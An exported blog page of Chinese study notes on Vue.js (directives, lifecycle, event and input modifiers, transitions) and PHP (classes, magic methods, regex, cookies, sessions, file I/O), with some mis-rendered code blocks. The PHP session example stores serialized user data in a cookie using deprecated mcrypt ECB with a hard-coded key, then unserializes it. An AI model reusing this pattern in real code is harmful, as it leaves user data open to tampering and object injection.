<p>##Vue.js是什么<br>Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。</p>
<a id="more"></a>
<p>##声明式渲染<br>Vue.js 的核心是一个允许采用简洁的模板语法来声明式地将数据渲染进 DOM 的系统（响应式系统）</p>
<p>##各种笔记<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.freeze()  会阻止修改现有属性，使响应式系统无法再追踪变化</span><br></pre></td></tr></table></figure></p>
<ul>
<li>你的站点上动态渲染的任意 HTML 可能会非常危险，因为它很容易导致 XSS 攻击。请只对可信内容使用 HTML 插值，绝不要对用户提供的内容使用插值。</li>
<li>应该优先通过 prop 和事件进行父子组件之间的通信，而不是 this.$parent 或改变 prop。</li>
<li>元素选择器应该避免在 scoped 中出现。<br> 在 scoped 样式中，类选择器比元素选择器更好，因为大量使用元素选择器是很慢的。</li>
<li>当 v-if 与 v-for 一起使用时，v-for 具有比 v-if 更高的优先级。</li>
<li>key 只适用于不依赖子组件状态或临时 DOM 状态 (例如：表单输入值) 的列表渲染输出。</li>
</ul>
<p>###实例生命周期钩子<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">created:  可以用来在一个实例被创建后执行代码</span><br><span class="line">mounted: </span><br><span class="line">updated: </span><br><span class="line">destroyed:</span><br></pre></td></tr></table></figure></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions" target="_blank" rel="noopener">箭头函数</a></p>
<p><a href="https://cn.vuejs.org/images/lifecycle.png" target="_blank" rel="noopener">生命周期钩子图</a></p>
<blockquote>
<p>v-bind = :  将元素与属性进行绑定,数据绑定 = “”里是js表达式<br>    v-model  双向数据绑定<br>    v-once  将静态内容缓存起来不进行渲染更新<br>    v-text(转义)   会输出html标签+内容<br>    v-html（不转义）  仅会输出内容<br>    v-if(控制dom的存在与否，一次性较佳)<br>    v-show（控制dom的显示与否，优先使用，性能高）<br>    v-for  数据循环展示<br>    :key=””提高性能，列表渲染，循环值不相同<br>    v-on = @  侦听dom事件</p>
</blockquote>
<blockquote>
<p>组件选项默认顺序</p>
<ol>
<li>副作用(触发组件外的影响)<br> el</li>
<li>全局感知(要求组件以外的知识)<br> name<br> parent</li>
<li>组件类型 (更改组件的类型)<br> functional</li>
<li>模板修改器 (改变模板的编译方式)<br> delimiters<br> comments</li>
<li>模板依赖 (模板内使用的资源)<br> components<br> directives<br> filters</li>
<li>组合 (向选项里合并属性)<br> extends<br> mixins</li>
<li>接口 (组件的接口)<br> inheritAttrs<br> model<br> props/propsData</li>
<li>本地状态 (本地的响应式属性)<br> data<br> computed</li>
<li>事件 (通过响应式事件触发的回调)<br> watch<br> 生命周期钩子 (按照它们被调用的顺序)<pre><code>beforeCreate
created
beforeMount
mounted
beforeUpdate
updated
activated
deactivated
beforeDestroy
destroyed
</code></pre></li>
<li>非响应式的属性 (不依赖响应系统的实例属性)<br>methods</li>
<li>渲染 (组件输出的声明式描述)<br>template/render<br>renderError</li>
</ol>
</blockquote>
<blockquote>
<p>元素 (包括组件) 特性顺序</p>
</blockquote>
<pre><code>定义 (提供组件的选项)
    is

列表渲染 (创建多个变化的相同元素)
    v-for

条件渲染 (元素是否渲染/显示)
    v-if
    v-else-if
    v-else
    v-show
    v-cloak

渲染方式 (改变元素的渲染方式)
    v-pre
    v-once

全局感知 (需要超越组件的知识)
    id

唯一的特性 (需要唯一值的特性)
    ref
    key
    slot

双向绑定 (把绑定和事件结合起来)
    v-model

其它特性 (所有普通的绑定或未绑定的特性)

事件 (组件事件监听器)
    v-on

内容 (覆写元素的内容)
    v-html
    v-text
</code></pre><ul>
<li>v-for on a <template>   </template></li>
<li>v-for with v-if</li>
</ul>
<p>###变异方法<br>Vue 包含一组观察数组的变异方法，所以它们也将会触发视图更新。这些方法如下：</p>
<blockquote>
</blockquote>
<pre><code>push()
pop()
shift()
unshift()
splice()
sort()
reverse()
</code></pre><p>你打开控制台，然后用前面例子的 items 数组调用变异方法：example1.items.push({ message: ‘Baz’ }) 。</p>
<p>####替换数组（高效）<br>变异方法 (mutation method)，顾名思义，会改变被这些方法调用的原始数组。相比之下，也有非变异 (non-mutating method) 方法，例如：filter(), concat() 和 slice() 。这些不会改变原始数组，但总是返回一个新数组。当使用非变异方法时，可以用新数组替换旧数组：</p>
<p>example1.items = example1.items.filter(function (item) {<br>  return item.message.match(/Foo/)<br>})</p>
<p>###v-on</p>
<p>####事件修饰符<br>    .stop   阻止执行<br>    .prevent  阻止重载<br>    .capture  事件捕获<br>    .self   元素本身触发<br>    .once  只触发一次<br>    .passive  滚动行为立即触发（尤其能提升移动端性能）</p>
<p>####按键码<br>    .enter<br>    .tab<br>    .delete (捕获“删除”和“退格”键)<br>    .esc<br>    .space<br>    .up<br>    .down<br>    .left<br>    .right</p>
<ul>
<li>键盘按钮修饰符<br>  .ctrl<br>  .alt<br>  .shift<br>  .meta（win）<br>  .exact   （修饰符允许控制由精确的系统修饰符组合触发的事件）</li>
<li>鼠标按钮修饰符<br>  .left<br>  .right<br>  .middle</li>
</ul>
<p>###v-model<br>v-model 在内部使用不同的属性为不同的输入元素并抛出不同的事件：<br>    text 和 textarea 元素使用 value 属性和 input 事件；<br>    checkbox 和 radio 使用 checked 属性和 change 事件；<br>    select 字段将 value 作为 prop 并将 change 作为事件。</p>
<p><a href="https://cn.vuejs.org/v2/guide/forms.html" target="_blank" rel="noopener">表单输入绑定</a></p>
<ul>
<li><p>修饰符<br>.lazy  转变为change时触发<br>.number  自动将用户的输入值转为数值类型<br>.trim  自动过滤用户输入的首尾空白字符</p>
</li>
<li><p>$emit</p>
</li>
<li>$event</li>
</ul>
<p>###单元素/组件的过渡</p>
<ul>
<li><p>类名<br>  v-enter：定义进入过渡的开始状态。在元素被插入之前生效，在元素被插入之后的下一帧移除。</p>
<p>  v-enter-active：定义进入过渡生效时的状态。在整个进入过渡的阶段中应用，在元素被插入之前生效，在过渡/动画完成之后移除。这个类可以被用来定义进入过渡的过程时间，延迟和曲线函数。</p>
<p>  v-enter-to: 2.1.8版及以上 定义进入过渡的结束状态。在元素被插入之后下一帧生效 (与此同时 v-enter 被移除)，在过渡/动画完成之后移除。</p>
<p>  v-leave: 定义离开过渡的开始状态。在离开过渡被触发时立刻生效，下一帧被移除。</p>
<p>  v-leave-active：定义离开过渡生效时的状态。在整个离开过渡的阶段中应用，在离开过渡被触发时立刻生效，在过渡/动画完成之后移除。这个类可以被用来定义离开过渡的过程时间，延迟和曲线函数。</p>
<p>  v-leave-to: 2.1.8版及以上 定义离开过渡的结束状态。在离开过渡被触发之后下一帧生效 (与此同时 v-leave 被删除)，在过渡/动画完成之后移除。<br><a href="https://cn.vuejs.org/v2/guide/transitions.html" target="_blank" rel="noopener">具体实例</a><br><a href="https://cn.vuejs.org/v2/guide/transitioning-state.html" target="_blank" rel="noopener">状态过渡</a></p>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> vue.js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP笔记]]></title>
      <url>/%E7%AC%94%E8%AE%B0/ckwd5ws8m003od0ucn7m4anll/</url>
      <content type="html"><![CDATA[<h2 id="类与面向对象"><a href="#类与面向对象" class="headerlink" title="类与面向对象"></a>类与面向对象</h2><hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span>&#123;</span><br><span class="line">    <span class="comment">//定义公共属性</span></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'汽车'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义受保护的属性</span></span><br><span class="line">    <span class="keyword">protected</span> $corlor = <span class="string">'白色'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义私有属性</span></span><br><span class="line">    <span class="keyword">private</span> $price = <span class="string">'100000'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//方法内部可以使用 $this 伪变量调用对象的属性或者方法 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义继承于Car的Truck类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Truck</span> <span class="keyword">extends</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">speedUp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化一个car对象</span></span><br><span class="line">$car = <span class="keyword">new</span> Car();</span><br><span class="line">$car-&gt;name = <span class="string">'奥迪A6'</span>; <span class="comment">//设置对象的属性值</span></span><br><span class="line"><span class="keyword">echo</span> $car-&gt;getName(); <span class="comment">//调用对象的方法 输出对象名字</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问控制：<br><code>public</code> 公开的<br><code>protected</code> 受保护的<br><code>private</code>私有的</p>
<p>一般通过-&gt;对象操作符来访问对象的属性或者方法，对于静态属性则使用::双冒号进行访问</p>
<p>使用关键字static修饰的，称之为静态方法，静态方法不需要实例化对象，可以通过类名直接调用，操作符为双冒号::</p>
<p>静态方法中，可以使用<code>self，parent，static</code>在内部调用静态方法与属性</p>
<hr>
<h2 id="构造函数和析构函数"><a href="#构造函数和析构函数" class="headerlink" title="构造函数和析构函数"></a>构造函数和析构函数</h2><p><code>__construct</code>  构造函数,具有构造函数的类，会在每次对象创建的时候调用该函数，因此常用来在对象创建的时候进行一些初始化工作</p>
<p><code>__destruct</code>  析构函数,析构函数指的是当某个对象的所有引用被删除，或者对象被显式的销毁时会执行的函数</p>
<hr>
<h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><ul>
<li>属性的重载</li>
</ul>
<p><code>__set</code>   实现对不存在属性的赋值<br><code>__get</code>  读取<br><code>__isset</code>  判断属性是否设置<br><code>__unset</code>  销毁</p>
<ul>
<li>方法的重载</li>
</ul>
<p><code>__call</code>  调用不存在的方法，调用不存在的静态方法时用 <figure class="highlight plain"><figcaption><span>static```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">``` php</span><br><span class="line">public function __call($speed,$car)&#123;</span><br><span class="line">        if($speed == &apos;speedDown&apos;)&#123;</span><br><span class="line">            $this-&gt;speed -= 10;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="对象的高级特性"><a href="#对象的高级特性" class="headerlink" title="对象的高级特性"></a>对象的高级特性</h2><ul>
<li>复制对象</li>
</ul>
<p><code>__clone</code>函数</p>
<ul>
<li>对象序列化</li>
</ul>
<p><code>serialize</code>  将对象序列化为字符串，用于存储或传递数据<br><code>unserialize</code>  将字符串反序列化成对象进行使用</p>
<hr>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则匹配：用一些特定的字符组合成一个规则字符串模式<br>使用PCRE库函数进行正则匹配</p>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p><a href="https://www.cnblogs.com/hellohell/p/5718319.html" target="_blank" rel="noopener">详解</a></p>
<p>/foo bar/  正斜线<br>\b  \b  单词定界符，完整单词或字符串<br>\B  \B  单词定界符，单词或字符串的一部分<br>|  选择字符，表示或，可以匹配任意长度的字符串<br>[]  多和链接字符-一起使用<br>^  $  行定位符<br><em>#</em>  hash符号<br>^  排除字符，一般放在[]中，表示排除不符合的字符<br><em>-</em> 链接字符<br>~  取反符号<br>\  反斜杠，用于转义也可使用<code>preg_quote</code>进行转义)<br>()  括号字符，改变限定符的作用范围；进行分组，便于反向引用</p>
<h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p><strong>用来限定每个字符串出现的次数</strong></p>
<p>?：零次或一次<br>*：零次或多次<br>+：一次或多次<br>{n}：n次<br>{n,}：至少n次<br>{n，m}：n到m次</p>
<h3 id="指定预定义的字符集"><a href="#指定预定义的字符集" class="headerlink" title="指定预定义的字符集"></a>指定预定义的字符集</h3><p>\d  任意一个十进制数字[0-9]<br>\D  任意一个非十进制数字<br>\s  任意一个空白字符(空格、\f换页、\n换行、\r回车、\t字表符)<br>\S    任意一个非空白字符<br>\w    任意一个单词字符<br>\W    任意个非单词字符</p>
<p>匹配邮箱格式:<code>/[\w\-]+@\w+\.\w+/</code></p>
<h3 id="模式修饰符"><a href="#模式修饰符" class="headerlink" title="模式修饰符"></a>模式修饰符</h3><p>常用——<br>i  忽略大小写匹配<br>m  将字符串视为多行，开始和结束将会指点字符串的每一行的开头是“^”，结束是“$”<br>s  将字符串视为一行<br>x  忽略空白</p>
<p>e  只用在<code>preg_replace()</code>函数中，在替换字符串中逆向引用做正常的替换，将其(即“替换字符串”)作为PHP代码求值，并用其结果来替换所搜索的字符串。<br>A  必须匹配字符串开头部分<br>D  模式中的$字符权匹配目标字符的结尾<br>E  与“m”相反，将匹配绝对字符串的结尾，而不是换行符前面<br>U  贪婪模式，最大限度的匹配，反转了匹配数量的值使其不是默认的重复，而变成在后面跟上“?”才变得重复<br>S  当一个模式将被使用若干次时，为加速匹配起见值得先对其进行分析，仅对没有单一固定起始字符的 non-anchored 模式有用</p>
<h3 id="贪婪模式与懒惰模式"><a href="#贪婪模式与懒惰模式" class="headerlink" title="贪婪模式与懒惰模式"></a>贪婪模式与懒惰模式</h3><p>贪婪模式：在可匹配与可不匹配的时候，优先匹配<br>例如  /\d+  \d+/<br>知道匹配字符长度时  /\d{数字}  \d{数字}/</p>
<p>.<em>  会匹配后面的一切字符<br>.</em>?  非贪婪模式，后跟符号表示结束条件</p>
<p>懒惰模式：在可匹配与可不匹配的时候，优先不匹配<br>例如  /\d?  \d?/</p>
<hr>
<h2 id="使用正则表达式进行匹配"><a href="#使用正则表达式进行匹配" class="headerlink" title="使用正则表达式进行匹配"></a>使用正则表达式进行匹配</h2><p><strong>强调</strong><br>指定预定义的字符集<br>\d  任意一个十进制数字[0-9]<br>\D  任意一个非十进制数字<br>\s  任意一个空白字符(空格、\f换页、\n换行、\r回车、\t字表符)<br>\S    任意一个非空白字符<br>\w    任意一个单词字符<br>\W    任意个非单词字符</p>
<p>常用模式修饰符<br>i  忽略大小写匹配<br>m  将字符串视为多行，开始和结束将会指点字符串的每一行的开头是“^”，结束是“$”<br>s  将字符串视为一行<br>x  忽略空白</p>
<h3 id="preg-match与preg-match-all"><a href="#preg-match与preg-match-all" class="headerlink" title="preg_match与preg_match_all"></a>preg_match与preg_match_all</h3><p><code>preg_match</code>用来执行一个匹配，可以简单的用来判断模式是否匹配成功，或者取得一个匹配结果，他的返回值是匹配成功的次数0或者1，在匹配到1次以后就会停止搜索</p>
<p><code>preg_match_all</code>可以循环获取一个列表的匹配结果数组</p>
<h3 id="搜索和替换"><a href="#搜索和替换" class="headerlink" title="搜索和替换"></a>搜索和替换</h3><p><code>preg_replace</code>函数</p>
<p>preg_replace(正则匹配，替换内容，数组);</p>
<h3 id="正则匹配常用案例"><a href="#正则匹配常用案例" class="headerlink" title="正则匹配常用案例"></a>正则匹配常用案例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'name'</span> =&gt; <span class="string">'spark1985'</span>,</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'spark@imooc.com'</span>,</span><br><span class="line">    <span class="string">'mobile'</span> =&gt; <span class="string">'13312345678'</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//进行一般性验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($user)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'用户信息不能为空'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strlen($user[<span class="string">'name'</span>]) &lt; <span class="number">6</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'用户名长度最少为6位'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用户名必须为字母、数字与下划线</span></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^\w+$/i'</span>, $user[<span class="string">'name'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'用户名不合法'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//验证邮箱格式是否正确</span></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^[\w\.]+@\w+\.\w+$/i'</span>, $user[<span class="string">'email'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'邮箱不合法'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//手机号必须为11位数字，且为1开头</span></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^1\d&#123;10&#125;$/i'</span>, $user[<span class="string">'mobile'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'手机号不合法'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'用户信息验证成功'</span>;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie是存储在客户端浏览器中的数据，我们通过Cookie来跟踪与存储用户数据。一般情况下，Cookie通过HTTP headers从服务端返回到客户端</p>
<p>PHP通过<code>setcookie</code>函数进行Cookie的设置，任何从浏览器发回的Cookie，PHP都会自动的将他存储在<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在使用会话Session时通常使用Cookie来存储会话id来识别用户，Cookie具备有效期，当有效期结束之后，Cookie会自动的从客户端删除</span><br><span class="line"></span><br><span class="line">### 设置cookie</span><br><span class="line"></span><br><span class="line">一个浏览器能创建的Cookie数量最多为**30**个，并且每个不能超过**4KB**，每个WEB站点能设置的Cookie总数不能超过**20**个</span><br><span class="line"></span><br><span class="line">**setcookie函数**</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line">name（ Cookie名）可以通过`$_COOKIE[&apos;name&apos;]` 进行访问</span><br><span class="line">value（Cookie的值）</span><br><span class="line">expire（过期时间）Unix时间戳格式，默认为0，表示浏览器关闭即失效</span><br><span class="line">path（有效路径）如果路径设置为&apos;/&apos;，则整个网站都有效</span><br><span class="line">domain（有效域）默认整个域名都有效，如果设置了&apos;www.baidu.com&apos;,则只在www子域中有效</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**setrawcookie函数需要手动进行unlencode**</span><br><span class="line"></span><br><span class="line">`setrawcookie(&apos;cookie_name&apos;, rawurlencode($value), time()+60*60*24*365);`</span><br><span class="line"></span><br><span class="line">**header方法**</span><br><span class="line"></span><br><span class="line">`header(&quot;Set-Cookie:cookie_name=value&quot;);`</span><br><span class="line"></span><br><span class="line">### 删除cookie</span><br><span class="line"></span><br><span class="line">在php中使用`“setcookie($cookiename, &apos;&apos;);”`或者`“setcookie($cookiename, NULL);”`都会删除cookie</span><br><span class="line"></span><br><span class="line">**setcookie 方法**</span><br><span class="line"></span><br><span class="line">`setcookie(&apos;cookie_name&apos;, &apos;&apos;, time()-1);`</span><br><span class="line"></span><br><span class="line">**header方法**</span><br><span class="line"></span><br><span class="line">`header(&quot;Set-Cookie:cookie_name=value;expires=&quot;.gmdate(&apos;D, d M Y H:i:s \G\M\T&apos;, time()-1);`</span><br><span class="line">用到`gmdate`函数，用来生成格林威治标准时间，以便排除时差的影响</span><br><span class="line"></span><br><span class="line">### session与cookie的异同</span><br><span class="line"></span><br><span class="line">``` php</span><br><span class="line">&lt;?php</span><br><span class="line">//开始使用session，执行session_start()方法</span><br><span class="line">session_start();</span><br><span class="line">//设置一个session，进行session的读写</span><br><span class="line">$_SESSION[&apos;test&apos;] = time();</span><br><span class="line">//显示当前的session_id</span><br><span class="line">echo &quot;session_id:&quot;.session_id();</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">//读取session值</span><br><span class="line">echo $_SESSION[&apos;test&apos;];</span><br><span class="line"></span><br><span class="line">//销毁一个session</span><br><span class="line">unset($_SESSION[&apos;test&apos;]);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure></p>
<h3 id="使用session来存储用户的登录信息"><a href="#使用session来存储用户的登录信息" class="headerlink" title="使用session来存储用户的登录信息"></a>使用session来存储用户的登录信息</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//假设用户登录成功获得了以下用户数据</span></span><br><span class="line">$userinfo = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'uid'</span>  =&gt; <span class="number">10000</span>,</span><br><span class="line">    <span class="string">'name'</span> =&gt; <span class="string">'spark'</span>,</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'spark@imooc.com'</span>,</span><br><span class="line">    <span class="string">'sex'</span>  =&gt; <span class="string">'man'</span>,</span><br><span class="line">    <span class="string">'age'</span>  =&gt; <span class="string">'18'</span></span><br><span class="line">);</span><br><span class="line">header(<span class="string">"content-type:text/html; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将用户信息保存到session中 */</span></span><br><span class="line">$_SESSION[<span class="string">'uid'</span>] = $userinfo[<span class="string">'uid'</span>];</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = $userinfo[<span class="string">'name'</span>];</span><br><span class="line">$_SESSION[<span class="string">'userinfo'</span>] = $userinfo;</span><br><span class="line"></span><br><span class="line"><span class="comment">//* 将用户数据保存到cookie中的一个简单方法 */</span></span><br><span class="line">$secureKey = <span class="string">'imooc'</span>; <span class="comment">//加密密钥</span></span><br><span class="line">$str = serialize($userinfo); <span class="comment">//将用户信息序列化</span></span><br><span class="line"><span class="comment">//用户信息加密前</span></span><br><span class="line">$str = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($secureKey), $str, MCRYPT_MODE_ECB));</span><br><span class="line"><span class="comment">//用户信息加密后</span></span><br><span class="line"><span class="comment">//将加密后的用户数据存储到cookie中</span></span><br><span class="line">setcookie(<span class="string">'userinfo'</span>, $str);</span><br><span class="line"></span><br><span class="line"><span class="comment">//当需要使用时进行解密</span></span><br><span class="line">$str = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($secureKey), base64_decode($str), MCRYPT_MODE_ECB);</span><br><span class="line">$uinfo = unserialize($str);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"解密后的用户信息：&lt;br&gt;"</span>;</span><br><span class="line">print_r($uinfo);</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="PHP文件系统"><a href="#PHP文件系统" class="headerlink" title="PHP文件系统"></a>PHP文件系统</h2><h3 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h3><p><code>file_get_contents</code>函数  可以将整个文件全部读取到一个字符串中</p>
<p>参数：<br><code>file_get_contents(path,include_path,context,start,max_length)</code> </p>
<p>方法：<br><code>fopen</code>  需要配合使用<code>fgets</code>和<code>fclose</code></p>
<p><strong>mode有下列几种形态字符串:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">r  打开只读文件，该文件必须存在。</span><br><span class="line">r+  打开可读写的文件，该文件必须存在。</span><br><span class="line">rb+  读写打开一个二进制文件，只允许读写数据。</span><br><span class="line">rt+  读写打开一个文本文件，允许读和写。</span><br><span class="line">w  打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。</span><br><span class="line">w+  打开可读写文件，若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件。</span><br><span class="line">a  以附加的方式打开只写文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留）</span><br><span class="line">a+  以附加方式打开可读写的文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留）</span><br><span class="line">wb  只写打开或新建一个二进制文件；只允许写数据。</span><br><span class="line">wb+ 读写打开或建立一个二进制文件，允许读和写。</span><br><span class="line">wt+ 读写打开或着建立一个文本文件；允许读写。</span><br><span class="line">at+ 读写打开一个文本文件，允许读或在文本末追加数据。</span><br><span class="line">ab+ 读写打开一个二进制文件，允许读或在文件末追加数据。</span><br></pre></td></tr></table></figure>
<p><code>fgets</code>  可以从文件指针中读取一行<br><code>fread</code>  可以读取指定长度的字符串</p>
<ul>
<li>用途</li>
</ul>
<p>**1. 可以用来打开一个网络地址 可以实现简单的网页抓取 </p>
<ol>
<li>可以读取本地的文件</li>
<li>可以模拟post请求**</li>
</ol>
<ul>
<li>判断文件是否存在</li>
</ul>
